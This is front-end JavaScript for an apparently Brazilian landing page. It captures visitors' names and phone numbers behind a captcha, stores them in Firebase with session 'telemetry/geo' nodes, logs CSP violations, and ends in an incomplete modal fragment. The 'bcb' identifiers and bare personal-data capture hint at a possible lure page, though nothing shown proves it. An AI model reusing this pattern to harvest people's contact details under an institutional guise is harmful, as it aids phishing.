<script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
    import { getAuth, signInAnonymously } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js';
    import { getDatabase, ref, update } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js';

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db   = getDatabase(app);

    const $ = sel => document.querySelector(sel);
    const nome = $('#nome');
    const tel  = $('#telefone');
    const btn  = $('#btnEntrar');
    const form = $('#loginForm');
    const msg  = $('#msg');

    let captchaOK = false;

    function validNome(v){ return (v||'').trim().length >= 2; }
    function validTel(v){ return /^(\d{2,3}[-\s]?)?\d{4,5}[-\s]?\d{4}$/.test((v||'').trim()); }
    function refreshBtn(){
      btn.disabled = !(validNome(nome.value) && validTel(tel.value) && captchaOK);
    }
    nome.addEventListener('input', refreshBtn);
    tel .addEventListener('input', refreshBtn);

    const captchaId = "4cd3729ca1308bca8d8dbadd103ef596";
    window.initGeetest4({
      captchaId,
      product: 'float',
      language: 'por'
    }, c => {
      c.appendTo("#captcha");
      c.onSuccess(() => { captchaOK = true; refreshBtn(); });
      c.onError(() => {
        captchaOK = false; refreshBtn();
        msg.textContent = "Falha ao validar o desafio. Tente novamente.";
        msg.className = "msg err";
      });
      c.onClose(() => {
        if (!c.getValidate()) { captchaOK = false; refreshBtn(); }
      });
    });

    function genSid(){
      const r = Math.random().toString(36).slice(2,8);
      return `${Date.now().toString(36)}-${r}`;
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      msg.textContent = ""; msg.className = "msg";

      if (!validNome(nome.value)){ msg.textContent="Digite um nome válido."; msg.className="msg err"; return; }
      if (!validTel(tel.value)){ msg.textContent="Digite um telefone válido (ex.: 31-91234-5678)."; msg.className="msg err"; return; }
      if (!captchaOK){ msg.textContent="Resolva o desafio de segurança."; msg.className="msg err"; return; }

      btn.disabled = true;

      try{
        const cred = await signInAnonymously(auth);
        const uid = cred.user.uid;
        const sid = genSid();

        // cria nó de contexto da sessão (base para telemetria/geo)
        const baseRef = ref(db, `usuarios/${uid}`);
        await update(baseRef, {
          nome: (nome.value||'').trim(),
          telefone: (tel.value||'').trim(),
          ultimoAcesso: Date.now(),
          [`sessoes/${sid}/contexto`]: { createdAt: Date.now() }
        });

        try {
          sessionStorage.setItem('bcb_uid', uid);
          sessionStorage.setItem('bcb_sid', sid);
        } catch {}

        msg.textContent = "Tudo certo! Redirecionando…";
        msg.className = "msg ok";
        location.href = 'site.html';
      }catch(err){
        console.error(err);
        btn.disabled = false;
        msg.textContent = "Não foi possível entrar. Verifique sua conexão e tente novamente.";
        msg.className = "msg err";
      }
    });
  
// CSP telemetry binder after sign-in succeeds
try {
  window.__bcb_bind_csp_logger__ && window.__bcb_bind_csp_logger__(async function(evt){
    try{
      const { getDatabase, ref, push } = await import('https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js');
      const db = getDatabase(app);
      const uid = (auth && auth.currentUser && auth.currentUser.uid) || (sessionStorage.getItem('bcb_uid')||null);
      const sid = (sessionStorage.getItem('bcb_sid')||null);
      if (!uid || !sid) return;
      const base = `telemetria/cspViolations/${uid}/${sid}`;
      await push(ref(db, base), evt);
    }catch(e){ /* noop */ }
  });
}catch(e){ /* noop */ }
</script>

<script>
(function(){
  const QKEY = "__bcb_csp_queue__";
  function queueEvent(evt){
    try{
      const cur = JSON.parse(localStorage.getItem(QKEY)||"[]");
      cur.push(evt);
      localStorage.setItem(QKEY, JSON.stringify(cur).slice(-4000));
    }catch{}
  }
  function onViolation(e){
    const evt = {
      ts: Date.now(),
      doc: location.pathname,
      blocked: e.blockedURI || null,
      violated: e.violatedDirective || null,
      type: e.effectiveDirective || null,
      line: e.lineNumber || null,
      col: e.columnNumber || null,
      src: e.sourceFile || null,
      sample: e.sample || null,
      dispo: (e.disposition || null)
    };
    if (window.__bcb_csp_log__){ window.__bcb_csp_log__(evt); } else { queueEvent(evt); }
  }
  window.addEventListener('securitypolicyviolation', onViolation);
  window.__bcb_bind_csp_logger__ = function(logFn){
    window.__bcb_csp_log__ = logFn;
    try{
      const cur = JSON.parse(localStorage.getItem(QKEY)||"[]");
      if (Array.isArray(cur) && cur.length){
        cur.forEach(evt => { try{ logFn(evt); }catch{} });
        localStorage.removeItem(QKEY);
      }
    }catch{}
  };
})();
</script>

<script>
(function(){ 
  const tel = document.getElementById('telefone');
  if(!tel) return;
  function digits(s){ return (s||'').replace(/\D+/g,''); }
  function fmt(v){
    const d = digits(v);
    if (d.length >= 11){ return d.replace(/^(\d{2})(\d{5})(\d{4}).*$/, "$1-$2-$3"); }
    if (d.length >= 10){ return d.replace(/^(\d{2})(\d{4})(\d{4}).*$/, "$1-$2-$3"); }
    if (d.length >= 7){ return d.replace(/^(\d{2})(\d{0,5})(\d{0,4}).*$/, "$1-$2-$3"); }
    if (d.length >= 3){ return d.replace(/^(\d{2})(\d{0,5}).*$/, "$1-$2"); }
    return d;
  }
  tel.setAttribute('inputmode','tel');
  tel.setAttribute('autocomplete','tel');
  tel.setAttribute('pattern','^(\\d{2,3}[-\\s]?)?\\d{4,5}[-\\s]?\\d{4}$');
  tel.addEventListener('input', (e)=>{
    const pos = e.target.selectionStart;
    const before = e.target.value;
    const after = fmt(before);
    e.target.value = after;
    try {
      const delta = after.length - before.length;
      e.target.setSelectionRange(Math.max(0, pos + delta), Math.max(0, pos + delta));
    } catch {}
  });
})();
</script>

      let aberto = false;

      function openOnFirstClick(){
        if (!aberto){
          modal.setAttribute('aria-hidden','false');
          aberto = true;
          document.removeEventListener('click', openOnFirstClick);
          try { document.body.style.overflow = 'hidden'; } catch {}

      btnSim && (btnSim.onclick = () => {

      });
